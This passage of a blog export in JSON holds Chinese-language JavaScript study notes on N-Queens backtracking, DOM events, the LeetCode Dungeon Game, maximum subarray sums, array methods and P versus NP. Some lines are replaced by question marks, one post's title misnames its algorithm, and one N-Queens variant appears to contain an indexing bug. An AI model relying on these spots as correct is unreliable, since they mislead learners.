[0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0]\n        ];\n        function printQ(queens) {  //打印棋盘\n            for (var row=0; row<queens.length; row++) {\n                var rowText = '';\n                for (var col=0; col<queens.length; col++) {\n                    if (queens[row][col]===undefined||queens[row][col]==null) {\n                        queens[row][col] = 0;\n                    }\n                    rowText = rowText + queens[row][col] + '  ';\n                }\n                console.log(rowText);\n            }\n        }\n        function isTrue(nQueens,row,col){   //检测该位置是否满足\n            for(var i=1;i<row+1;i++){\n                if(nQueens[row-i][col]==1|| nQueens[row-i][col+i]|| nQueens[row-i][col-i]){return false}\n            }\n            return true;\n        }\n\n\n回溯法。一行只能有一个棋子。从第一行第一个格子放起。放了以后。再从第二排开始第一个格子检测，如果为true，则放下。然后，下一行第一个格子检测。如果其中有一排都为false且不是最后一排。则退后一行（row=row-2）。继续上一行检测.如果上一行的最后一个为1，退后2排（row=row-3）。\n\n\n    function NQueens(order){\n            var tempCol=0;\n            rowLoop:\n            for(var row=0;row<order;row++){\n                for(var col=tempCol;col<order;col++){\n                    tempCol=0;\n                    if(isTrue(nQueens,row,col)){\n                        nQueens[row][col]=1;\n                        if(row==7){\n                            QSS.push(cloneObj(nQueens));\n                            var mIndex=nQueens[row].indexOf(1);\n                            nQueens[row][mIndex]=0;\n                            if(col==7){\n                                var mIndex=nQueens[row-1].indexOf(1);\n                                nQueens[row-1][mIndex]=0;\n                                row= row-2;\n                                tempCol=mIndex+1;\n                                continue rowLoop;\n                            }\n                            continue;\n                        }\n                        continue rowLoop;\n\n                    }else{//next\n                        if(col==7){\n                            var mIndex=nQueens[row-1].indexOf(1);\n                            nQueens[row-1][mIndex]=0;\n                            if(mIndex==7){\n                                if(row==1){   alert('????????????'); break rowLoop;}\n                                mIndex=nQueens[row-2].indexOf(1);\n                                nQueens[row-2][mIndex]=0;\n                                row = row-3;\n                                tempCol=mIndex+1;\n                            }\n                            else{\n                                row= row-2;\n                                tempCol=mIndex+1;\n                            }\n                            continue rowLoop;\n                        }\n                    }\n                }\n            }\n        }\n\n        NQueens(8);\n\n        console.log(QSS.length)\n        for(var x in QSS){\n            console.log('///////////////////////')\n            printQ(QSS[x])\n        }\n\n\n结果如下\n\n一共92个解。\n\n该题可以利用左右对称。只需求出46个解。就可以得出92个解。在这里两种情况都要考虑到。\n如果其中有一排都为false且不是最后一排。则退后一行（row=row-2）。继续上一行检测.如果上一行的最后一个为1，退后2排（row=row-3）。\n\n\n        function NQueens(order){\n            var tempCol=0;\n            rowLoop:\n            for(var row=0;row<order;row++){\n                for(var col=tempCol;col<order;col++){\n                    tempCol=0;\n                    if(isTrue(nQueens,row,col)){\n                        nQueens[row][col]=1;\n                        if(row==7){\n                            QSS.push(cloneObj(nQueens));\n                            var mIndex=nQueens[row].indexOf(1);\n                            nQueens[row][mIndex]=0;\n                            if(col==7){\n                                var mIndex=nQueens[row-1].indexOf(1);\n                                nQueens[row-2][mIndex]=0;\n                                row= row-2;\n                                tempCol=mIndex+1;\n                                continue rowLoop;\n                            }\n                            continue;\n                        }\n                        continue rowLoop;\n\n                    }else{//next\n                        if(col==7){\n                            var mIndex=nQueens[row-1].indexOf(1);\n                            nQueens[row-1][mIndex]=0;\n                            if(mIndex==3&&row==1){\n                                alert('完成一半');  //在此跳出循环\n                            }\n                            if(mIndex==7){\n                                if(row==1){   alert('回溯完成'); break rowLoop;}\n                                mIndex=nQueens[row-2].indexOf(1);\n                                nQueens[row-2][mIndex]=0;\n                                if(mIndex==3&&row==2){\n                                    console.log(QSS.length)\n                                    alert('完成一半');   //在此跳出循环(真)\n                                }\n                                row = row-3;\n                                tempCol=mIndex+1;\n                            }\n                            else{\n                                row= row-2;\n                                tempCol=mIndex+1;\n                            }\n                            continue rowLoop;\n                        }\n                    }\n                }\n            }\n        }\n\n        NQueens(8);\n\n        console.log(QSS.length)\n        for(var x in QSS){\n            console.log('/////////////')\n            printQ(QSS[x])\n        }","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-01-22T07:00:03.000Z","created_by":"1","updated_at":"2017-01-17T07:21:43.000Z","updated_by":"1","published_at":"2016-01-25T15:31:21.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c6","uuid":"53761745-6f38-451d-86d8-48b98b340a55","title":"dom事件","slug":"domshi-jian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\" 原生js有两种事件注册的方法\\n      var cc=   document.getElementById('cc');\\n\\n``` \\n第一种：\\n    cc.onmousedown=function(){\\n       console.log(cc)\\n       alert('123')\\n   };\\n第二种：\\n    cc.addEventListener('mousedown',function(){\\n       alert('456')\\n    },false)\\n```\\n第一种会覆盖第一种的事件注册。而第二种不会覆盖。\\n\\njq的事件注册不能与原生的共存。只会注册原生的。\\n\\n事件移除（不能使用匿名函数）\\n```\\n  原生js：\\n function asd(){     \\n     alert('asd')\\n }\\n  cc.addEventListener('mousedown',asd,false)\\n  cc.removeEventListener('mousedown',asd,false)\\n  JQ：\\n $('#cc').click(asd)\\n// $('#cc').on('click',asd)\\n $('#cc').unbind('click',asd)\\n```\\n\\n        \"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>原生js有两种事件注册的方法<br>\nvar cc=   document.getElementById('cc');</p>\n<pre><code>第一种：\n    cc.onmousedown=function(){\n       console.log(cc)\n       alert('123')\n   };\n第二种：\n    cc.addEventListener('mousedown',function(){\n       alert('456')\n    },false)\n</code></pre>\n<p>第一种会覆盖第一种的事件注册。而第二种不会覆盖。</p>\n<p>jq的事件注册不能与原生的共存。只会注册原生的。</p>\n<p>事件移除（不能使用匿名函数）</p>\n<pre><code>  原生js：\n function asd(){     \n     alert('asd')\n }\n  cc.addEventListener('mousedown',asd,false)\n  cc.removeEventListener('mousedown',asd,false)\n  JQ：\n $('#cc').click(asd)\n// $('#cc').on('click',asd)\n $('#cc').unbind('click',asd)\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"6","plaintext":"原生js有两种事件注册的方法\nvar cc= document.getElementById('cc');\n\n第一种：\n    cc.onmousedown=function(){\n       console.log(cc)\n       alert('123')\n   };\n第二种：\n    cc.addEventListener('mousedown',function(){\n       alert('456')\n    },false)\n\n\n第一种会覆盖第一种的事件注册。而第二种不会覆盖。\n\njq的事件注册不能与原生的共存。只会注册原生的。\n\n事件移除（不能使用匿名函数）\n\n  原生js：\n function asd(){     \n     alert('asd')\n }\n  cc.addEventListener('mousedown',asd,false)\n  cc.removeEventListener('mousedown',asd,false)\n  JQ：\n $('#cc').click(asd)\n// $('#cc').on('click',asd)\n $('#cc').unbind('click',asd)","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-15T09:15:43.000Z","created_by":"1","updated_at":"2017-01-17T07:19:47.000Z","updated_by":"1","published_at":"2016-02-15T09:25:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c7","uuid":"c5ff562c-6141-4db2-91f1-48b7da94fda1","title":"DungeonGame一道动态规划的题--LeetCode","slug":"dungeongame","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"**Write a function to determine the knight's minimum initial health so that he is able to rescue the princess.**\\n\\n**For example, given the dungeon below, the initial health of the knight must be at least 7 if he follows the optimal path RIGHT-> RIGHT -> DOWN -> DOWN.**\\n```\\n-2(K)\\t-3\\t   3\\n -5\\t -10\\t 1\\n 10\\t  30\\t-5 (P)\\n```\\n>######Notes:\\n\\nThe knight's health has no upper bound.\\nAny room can contain threats or power-ups, even the first room the knight enters and the bottom-right room where the princess is imprisoned.\\n\\n题目大意： 有一个2D方格，每个方格有个数字，要求从左上角走到右下角，没次走的方向只能是右边和下面，如果格子的数字大于0，表示可以在这个格子加hp，如果小于0就要减掉相应数字的hp.如果到达任何一个格子时，hp为0，表示不能达到这个位置。求刚开始需要初始化多少hp才能保证走到右下角的格子。\\n\\n这是一个动态规划的题。用BFS，从(2,2)到(0,0)\\n```\\n      var calculateMinimumHP = function(dungeon) {\\n            var colSize=dungeon[0].length;\\n            var rowSize=dungeon.length;\\n            var dp=[];\\n            for(var i=0;i<rowSize;i++){\\n                dp.push([])\\n            }\\n            dp[rowSize-1][colSize-1] = Math.max(1 - dungeon[rowSize-1][colSize-1], 1);\\n             if(colSize===1&&rowSize===1){return dp[rowSize-1][colSize-1];}\\n            function move(arr){\\n                var tempArr=[];\\n                for(var x of arr){\\n                    if(x[0]-1>=0){   //左移\\n                        if(dp[x[1]][x[0]-1]===undefined){\\n                            dp[x[1]][x[0]-1]=Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]][x[0]-1])\\n                            tempArr.push([x[0]-1,x[1]])\\n                        }else{\\n                            dp[x[1]][x[0]-1]= Math.min(dp[x[1]][x[0]-1] ,Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]][x[0]-1]))\\n\\n                        }\\n                    }\\n                    if(x[1]-1>=0){   //上移\\n                        if(dp[x[1]-1][x[0]]===undefined){\\n                            dp[x[1]-1][x[0]]=Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]-1][x[0]])\\n                            tempArr.push([x[0],x[1]-1])\\n                        }else{\\n                            dp[x[1]-1][x[0]]= Math.min(dp[x[1]-1][x[0]] ,Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]-1][x[0]]))\\n                        }\\n                    }\\n                }\\n                if(tempArr.length===1){\\n                    if(tempArr[0][0]===0&&tempArr[0][1]===0){\\n                        return dp[0][0]\\n                    }\\n                }\\n                return move(tempArr);\\n            }\\n            return  move([[colSize-1,rowSize-1]])\\n        };//Runtime: 160 ms\\n```\\n最优的解，用的是类似Floyd算法的思想：\\n```\\n        var calculateMinimumHP = function(dungeon) {\\n            var colSize=dungeon[0].length;\\n            var rowSize=dungeon.length;\\n            function move(XY) {\\n                if(XY[0]==colSize-1&&XY[1]==rowSize-1){return Math.max(1,1-dungeon[rowSize-1][colSize-1]);}\\n                if(XY[0]>=colSize){return Infinity}\\n                if(XY[1]>=rowSize){return Infinity}\\n                var right = Math.max(1,move([XY[0]+1,XY[1]])-dungeon[XY[1]][XY[0]]);\\n                var down =  Math.max(1,move([XY[0],XY[1]+1])-dungeon[XY[1]][XY[0]]);\\n                return Math.min(right,down);\\n            }\\n            return  move([0,0])\\n        };\\n```\\n?????????????????????????????Floyd??????????????????\\n```\\n     var calculateMinimumHP = function(dungeon) {\\n            var m = dungeon.length;\\n            var n = dungeon[0].length;\\n            var dp=[];\\n            for(var i=0;i<m;i++){\\n                dp.push([]);\\n            }\\n            dp[m-1][n-1] = Math.max(1 - dungeon[m-1][n-1], 1);\\n            for(var i = m-2; i >= 0; i--){\\n                dp[i][n-1] = Math.max(dp[i+1][n-1] - dungeon[i][n-1], 1);\\n            }\\n            for(var i = n-2; i >= 0; i--){\\n                dp[m-1][i] = Math.max(dp[m-1][i+1] - dungeon[m-1][i], 1);\\n            }\\n            for(var i = m-2; i >= 0; i--){\\n                for(var j = n-2; j >= 0; j--){\\n                    dp[i][j] = Math.max(Math.min(dp[i][j+1], dp[i+1][j]) - dungeon[i][j], 1);\\n                }\\n            }\\n            return dp[0][0] ;\\n        };//Runtime: 100 ms\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><strong>Write a function to determine the knight's minimum initial health so that he is able to rescue the princess.</strong></p>\n<p><strong>For example, given the dungeon below, the initial health of the knight must be at least 7 if he follows the optimal path RIGHT-&gt; RIGHT -&gt; DOWN -&gt; DOWN.</strong></p>\n<pre><code>-2(K)\t-3\t   3\n -5\t -10\t 1\n 10\t  30\t-5 (P)\n</code></pre>\n<blockquote>\n<h6 id=\"notes\">Notes:</h6>\n</blockquote>\n<p>The knight's health has no upper bound.<br>\nAny room can contain threats or power-ups, even the first room the knight enters and the bottom-right room where the princess is imprisoned.</p>\n<p>题目大意： 有一个2D方格，每个方格有个数字，要求从左上角走到右下角，没次走的方向只能是右边和下面，如果格子的数字大于0，表示可以在这个格子加hp，如果小于0就要减掉相应数字的hp.如果到达任何一个格子时，hp为0，表示不能达到这个位置。求刚开始需要初始化多少hp才能保证走到右下角的格子。</p>\n<p>这是一个动态规划的题。用BFS，从(2,2)到(0,0)</p>\n<pre><code>      var calculateMinimumHP = function(dungeon) {\n            var colSize=dungeon[0].length;\n            var rowSize=dungeon.length;\n            var dp=[];\n            for(var i=0;i&lt;rowSize;i++){\n                dp.push([])\n            }\n            dp[rowSize-1][colSize-1] = Math.max(1 - dungeon[rowSize-1][colSize-1], 1);\n             if(colSize===1&amp;&amp;rowSize===1){return dp[rowSize-1][colSize-1];}\n            function move(arr){\n                var tempArr=[];\n                for(var x of arr){\n                    if(x[0]-1&gt;=0){   //左移\n                        if(dp[x[1]][x[0]-1]===undefined){\n                            dp[x[1]][x[0]-1]=Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]][x[0]-1])\n                            tempArr.push([x[0]-1,x[1]])\n                        }else{\n                            dp[x[1]][x[0]-1]= Math.min(dp[x[1]][x[0]-1] ,Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]][x[0]-1]))\n\n                        }\n                    }\n                    if(x[1]-1&gt;=0){   //上移\n                        if(dp[x[1]-1][x[0]]===undefined){\n                            dp[x[1]-1][x[0]]=Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]-1][x[0]])\n                            tempArr.push([x[0],x[1]-1])\n                        }else{\n                            dp[x[1]-1][x[0]]= Math.min(dp[x[1]-1][x[0]] ,Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]-1][x[0]]))\n                        }\n                    }\n                }\n                if(tempArr.length===1){\n                    if(tempArr[0][0]===0&amp;&amp;tempArr[0][1]===0){\n                        return dp[0][0]\n                    }\n                }\n                return move(tempArr);\n            }\n            return  move([[colSize-1,rowSize-1]])\n        };//Runtime: 160 ms\n</code></pre>\n<p>最优的解，用的是类似Floyd算法的思想：</p>\n<pre><code>        var calculateMinimumHP = function(dungeon) {\n            var colSize=dungeon[0].length;\n            var rowSize=dungeon.length;\n            function move(XY) {\n                if(XY[0]==colSize-1&amp;&amp;XY[1]==rowSize-1){return Math.max(1,1-dungeon[rowSize-1][colSize-1]);}\n                if(XY[0]&gt;=colSize){return Infinity}\n                if(XY[1]&gt;=rowSize){return Infinity}\n                var right = Math.max(1,move([XY[0]+1,XY[1]])-dungeon[XY[1]][XY[0]]);\n                var down =  Math.max(1,move([XY[0],XY[1]+1])-dungeon[XY[1]][XY[0]]);\n                return Math.min(right,down);\n            }\n            return  move([0,0])\n        };\n</code></pre>\n<p>?????????????????????????????Floyd??????????????????</p>\n<pre><code>     var calculateMinimumHP = function(dungeon) {\n            var m = dungeon.length;\n            var n = dungeon[0].length;\n            var dp=[];\n            for(var i=0;i&lt;m;i++){\n                dp.push([]);\n            }\n            dp[m-1][n-1] = Math.max(1 - dungeon[m-1][n-1], 1);\n            for(var i = m-2; i &gt;= 0; i--){\n                dp[i][n-1] = Math.max(dp[i+1][n-1] - dungeon[i][n-1], 1);\n            }\n            for(var i = n-2; i &gt;= 0; i--){\n                dp[m-1][i] = Math.max(dp[m-1][i+1] - dungeon[m-1][i], 1);\n            }\n            for(var i = m-2; i &gt;= 0; i--){\n                for(var j = n-2; j &gt;= 0; j--){\n                    dp[i][j] = Math.max(Math.min(dp[i][j+1], dp[i+1][j]) - dungeon[i][j], 1);\n                }\n            }\n            return dp[0][0] ;\n        };//Runtime: 100 ms\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"7","plaintext":"Write a function to determine the knight's minimum initial health so that he is\nable to rescue the princess.\n\nFor example, given the dungeon below, the initial health of the knight must be\nat least 7 if he follows the optimal path RIGHT-> RIGHT -> DOWN -> DOWN.\n\n-2(K)\t-3\t   3\n -5\t -10\t 1\n 10\t  30\t-5 (P)\n\n\n> Notes:\n\nThe knight's health has no upper bound.\nAny room can contain threats or power-ups, even the first room the knight enters\nand the bottom-right room where the princess is imprisoned.\n\n题目大意：\n有一个2D方格，每个方格有个数字，要求从左上角走到右下角，没次走的方向只能是右边和下面，如果格子的数字大于0，表示可以在这个格子加hp，如果小于0就要减掉相应数字的hp.如果到达任何一个格子时，hp为0，表示不能达到这个位置。求刚开始需要初始化多少hp才能保证走到右下角的格子。\n\n这是一个动态规划的题。用BFS，从(2,2)到(0,0)\n\n      var calculateMinimumHP = function(dungeon) {\n            var colSize=dungeon[0].length;\n            var rowSize=dungeon.length;\n            var dp=[];\n            for(var i=0;i<rowSize;i++){\n                dp.push([])\n            }\n            dp[rowSize-1][colSize-1] = Math.max(1 - dungeon[rowSize-1][colSize-1], 1);\n             if(colSize===1&&rowSize===1){return dp[rowSize-1][colSize-1];}\n            function move(arr){\n                var tempArr=[];\n                for(var x of arr){\n                    if(x[0]-1>=0){   //左移\n                        if(dp[x[1]][x[0]-1]===undefined){\n                            dp[x[1]][x[0]-1]=Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]][x[0]-1])\n                            tempArr.push([x[0]-1,x[1]])\n                        }else{\n                            dp[x[1]][x[0]-1]= Math.min(dp[x[1]][x[0]-1] ,Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]][x[0]-1]))\n\n                        }\n                    }\n                    if(x[1]-1>=0){   //上移\n                        if(dp[x[1]-1][x[0]]===undefined){\n                            dp[x[1]-1][x[0]]=Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]-1][x[0]])\n                            tempArr.push([x[0],x[1]-1])\n                        }else{\n                            dp[x[1]-1][x[0]]= Math.min(dp[x[1]-1][x[0]] ,Math.max(1, dp[x[1]][x[0]]-dungeon[x[1]-1][x[0]]))\n                        }\n                    }\n                }\n                if(tempArr.length===1){\n                    if(tempArr[0][0]===0&&tempArr[0][1]===0){\n                        return dp[0][0]\n                    }\n                }\n                return move(tempArr);\n            }\n            return  move([[colSize-1,rowSize-1]])\n        };//Runtime: 160 ms\n\n\n最优的解，用的是类似Floyd算法的思想：\n\n        var calculateMinimumHP = function(dungeon) {\n            var colSize=dungeon[0].length;\n            var rowSize=dungeon.length;\n            function move(XY) {\n                if(XY[0]==colSize-1&&XY[1]==rowSize-1){return Math.max(1,1-dungeon[rowSize-1][colSize-1]);}\n                if(XY[0]>=colSize){return Infinity}\n                if(XY[1]>=rowSize){return Infinity}\n                var right = Math.max(1,move([XY[0]+1,XY[1]])-dungeon[XY[1]][XY[0]]);\n                var down =  Math.max(1,move([XY[0],XY[1]+1])-dungeon[XY[1]][XY[0]]);\n                return Math.min(right,down);\n            }\n            return  move([0,0])\n        };\n\n\n?????????????????????????????Floyd??????????????????\n\n     var calculateMinimumHP = function(dungeon) {\n            var m = dungeon.length;\n            var n = dungeon[0].length;\n            var dp=[];\n            for(var i=0;i<m;i++){\n                dp.push([]);\n            }\n            dp[m-1][n-1] = Math.max(1 - dungeon[m-1][n-1], 1);\n            for(var i = m-2; i >= 0; i--){\n                dp[i][n-1] = Math.max(dp[i+1][n-1] - dungeon[i][n-1], 1);\n            }\n            for(var i = n-2; i >= 0; i--){\n                dp[m-1][i] = Math.max(dp[m-1][i+1] - dungeon[m-1][i], 1);\n            }\n            for(var i = m-2; i >= 0; i--){\n                for(var j = n-2; j >= 0; j--){\n                    dp[i][j] = Math.max(Math.min(dp[i][j+1], dp[i+1][j]) - dungeon[i][j], 1);\n                }\n            }\n            return dp[0][0] ;\n        };//Runtime: 100 ms","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-15T09:27:32.000Z","created_by":"1","updated_at":"2017-01-17T07:18:53.000Z","updated_by":"1","published_at":"2016-02-15T09:32:02.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c8","uuid":"08b67ab6-7c71-47ce-8bb2-150a07abb94b","title":"求最大公共子序列（动态规划）","slug":"qiu-zui-da-gong-gong-zi-xu-lie","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"求[1, -2, 3, 5, -3, 2]的最大公共子序列\\n最直接的回溯\\n```\\n       function MaxSubString1(arr,n)\\n        {\\n            var  max = Number.NEGATIVE_INFINITY;  //初始值为负无穷大\\n            var  sum;\\n            for(var i = 0; i < n; i++)\\n            {\\n                sum = 0;\\n                for(var j = i; j < n; j++)\\n                {\\n                    sum += arr[j];\\n                    if(sum > max)\\n                        max = sum;\\n                }\\n            }\\n            return max;\\n        }\\n```\\n动态规划的解\\n```\\n  function MaxSubString(arr,n)\\n        {\\n            var  sum = arr[n - 1];\\n            var  max = arr[n - 1];\\n            for(var  i = n - 2; i >= 0; i--)??? //从后向前遍历，反之亦可。\\n            {\\n                sum = Math.max( arr[i], arr[i] + sum);\\n                max = Math.max(sum, max);\\n            }\\n            return max;?????????????????????? \\n        }\\n        MaxSubString([1, -2, 3, 5, -3, 2],6)\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>求[1, -2, 3, 5, -3, 2]的最大公共子序列<br>\n最直接的回溯</p>\n<pre><code>       function MaxSubString1(arr,n)\n        {\n            var  max = Number.NEGATIVE_INFINITY;  //初始值为负无穷大\n            var  sum;\n            for(var i = 0; i &lt; n; i++)\n            {\n                sum = 0;\n                for(var j = i; j &lt; n; j++)\n                {\n                    sum += arr[j];\n                    if(sum &gt; max)\n                        max = sum;\n                }\n            }\n            return max;\n        }\n</code></pre>\n<p>动态规划的解</p>\n<pre><code>  function MaxSubString(arr,n)\n        {\n            var  sum = arr[n - 1];\n            var  max = arr[n - 1];\n            for(var  i = n - 2; i &gt;= 0; i--)??? //从后向前遍历，反之亦可。\n            {\n                sum = Math.max( arr[i], arr[i] + sum);\n                max = Math.max(sum, max);\n            }\n            return max;?????????????????????? \n        }\n        MaxSubString([1, -2, 3, 5, -3, 2],6)\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"8","plaintext":"求[1, -2, 3, 5, -3, 2]的最大公共子序列\n最直接的回溯\n\n       function MaxSubString1(arr,n)\n        {\n            var  max = Number.NEGATIVE_INFINITY;  //初始值为负无穷大\n            var  sum;\n            for(var i = 0; i < n; i++)\n            {\n                sum = 0;\n                for(var j = i; j < n; j++)\n                {\n                    sum += arr[j];\n                    if(sum > max)\n                        max = sum;\n                }\n            }\n            return max;\n        }\n\n\n动态规划的解\n\n  function MaxSubString(arr,n)\n        {\n            var  sum = arr[n - 1];\n            var  max = arr[n - 1];\n            for(var  i = n - 2; i >= 0; i--)??? //从后向前遍历，反之亦可。\n            {\n                sum = Math.max( arr[i], arr[i] + sum);\n                max = Math.max(sum, max);\n            }\n            return max;?????????????????????? \n        }\n        MaxSubString([1, -2, 3, 5, -3, 2],6)","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-15T09:35:38.000Z","created_by":"1","updated_at":"2017-01-17T07:17:00.000Z","updated_by":"1","published_at":"2016-02-15T09:41:10.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c9","uuid":"3769b77b-faa6-4b4f-a457-831fb5aa3572","title":"js数组笔记","slug":"jsshu-zu-shen-ru","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"* concat：合并数组(不会改变a。合并成一个新数组return的)\\n```\\nvar a=[1];\\nvar b=[2];\\nvar c= a.concat(b);\\n\\n```\\n可以使用Array.prototype.push.apply(a,b) 这样就改变的a。\\n\\n* slice(start,end):从已有的数组中返回选定的元素。不会改变原数组\\n\\n* splice(index,length,item1,.....,itemX):从数组中添加/删除项目，然后返回被删除的项目。\\n\\n```\\n参数\\t描述\\nindex\\t必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。\\nlength\\t必需。要删除的项目数量。如果设置为 0，则不会删除项目。\\nitem1, ..., itemX\\t可选。向数组添加的新项目。\\n```\\n\\n> 以下是w3school上面的其它的api\\n\\n```\\n\\n方法\\t描述\\njoin()\\t把数组的所有元素放入一个字符串。元素通过指定的分隔符进行分隔。\\npop()\\t删除并返回数组的最后一个元素\\npush()\\t向数组的末尾添加一个或更多元素，并返回新的长度。\\nreverse()\\t颠倒数组中元素的顺序。\\nshift()\\t删除并返回数组的第一个元素\\nsort()\\t对数组的元素进行排序\\ntoString()\\t把数组转换为字符串，并返回结果。\\ntoLocaleString()\\t把数组转换为本地数组，并返回结果。\\nunshift()\\t向数组的开头添加一个或更多元素，并返回新的长度。\\nvalueOf()\\t返回数组对象的原始值\\n```\\n```\\nArray.from()//可以将Set，Map转Array。  \\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><ul>\n<li>concat：合并数组(不会改变a。合并成一个新数组return的)</li>\n</ul>\n<pre><code>var a=[1];\nvar b=[2];\nvar c= a.concat(b);\n\n</code></pre>\n<p>可以使用Array.prototype.push.apply(a,b) 这样就改变的a。</p>\n<ul>\n<li>\n<p>slice(start,end):从已有的数组中返回选定的元素。不会改变原数组</p>\n</li>\n<li>\n<p>splice(index,length,item1,.....,itemX):从数组中添加/删除项目，然后返回被删除的项目。</p>\n</li>\n</ul>\n<pre><code>参数\t描述\nindex\t必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。\nlength\t必需。要删除的项目数量。如果设置为 0，则不会删除项目。\nitem1, ..., itemX\t可选。向数组添加的新项目。\n</code></pre>\n<blockquote>\n<p>以下是w3school上面的其它的api</p>\n</blockquote>\n<pre><code>\n方法\t描述\njoin()\t把数组的所有元素放入一个字符串。元素通过指定的分隔符进行分隔。\npop()\t删除并返回数组的最后一个元素\npush()\t向数组的末尾添加一个或更多元素，并返回新的长度。\nreverse()\t颠倒数组中元素的顺序。\nshift()\t删除并返回数组的第一个元素\nsort()\t对数组的元素进行排序\ntoString()\t把数组转换为字符串，并返回结果。\ntoLocaleString()\t把数组转换为本地数组，并返回结果。\nunshift()\t向数组的开头添加一个或更多元素，并返回新的长度。\nvalueOf()\t返回数组对象的原始值\n</code></pre>\n<pre><code>Array.from()//可以将Set，Map转Array。  \n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"9","plaintext":" * concat：合并数组(不会改变a。合并成一个新数组return的)\n\nvar a=[1];\nvar b=[2];\nvar c= a.concat(b);\n\n\n\n可以使用Array.prototype.push.apply(a,b) 这样就改变的a。\n\n * slice(start,end):从已有的数组中返回选定的元素。不会改变原数组\n   \n   \n * splice(index,length,item1,.....,itemX):从数组中添加/删除项目，然后返回被删除的项目。\n   \n   \n\n参数\t描述\nindex\t必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。\nlength\t必需。要删除的项目数量。如果设置为 0，则不会删除项目。\nitem1, ..., itemX\t可选。向数组添加的新项目。\n\n\n> 以下是w3school上面的其它的api\n\n\n\n方法\t描述\njoin()\t把数组的所有元素放入一个字符串。元素通过指定的分隔符进行分隔。\npop()\t删除并返回数组的最后一个元素\npush()\t向数组的末尾添加一个或更多元素，并返回新的长度。\nreverse()\t颠倒数组中元素的顺序。\nshift()\t删除并返回数组的第一个元素\nsort()\t对数组的元素进行排序\ntoString()\t把数组转换为字符串，并返回结果。\ntoLocaleString()\t把数组转换为本地数组，并返回结果。\nunshift()\t向数组的开头添加一个或更多元素，并返回新的长度。\nvalueOf()\t返回数组对象的原始值\n\n\nArray.from()//可以将Set，Map转Array。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-16T01:35:19.000Z","created_by":"1","updated_at":"2017-01-17T07:15:52.000Z","updated_by":"1","published_at":"2016-02-16T02:05:07.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2ca","uuid":"bd660250-f001-4417-a505-3bad8507c097","title":"关于P,NP,NPC和NP-hard的通俗解释","slug":"guan-yu-p-np-npche-np-hardde-tong-su-jie-shi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"P: Polynomial Solvable\\nNP: Non-determinstic Polynomial Solvable\\n词语解释：\\n\\n* Polynomial 【数】多项式的； 由平方，立方等常数次方或者更小的运算符和+,-,*,/等构成的式子及其这种式子的和\\n* Non-deterministic: 非确定性的（如：时间复杂度为O(n^logn)、O(n!)、O(2^n))\\nTuring-machine: 图灵机; 英国数学家图灵提出的计算模型, 一个两端无限长的由小格子组 成的带子，每个格子可以存储一个数，一个可以在带子左右移动的游标或者指针或者不如叫 磁头(head), 磁头可读或修改格子里的数。 下面默认说的是确定性图灵机，和非确定性图 灵机功能上等价\\n* Algorithm: 算法。 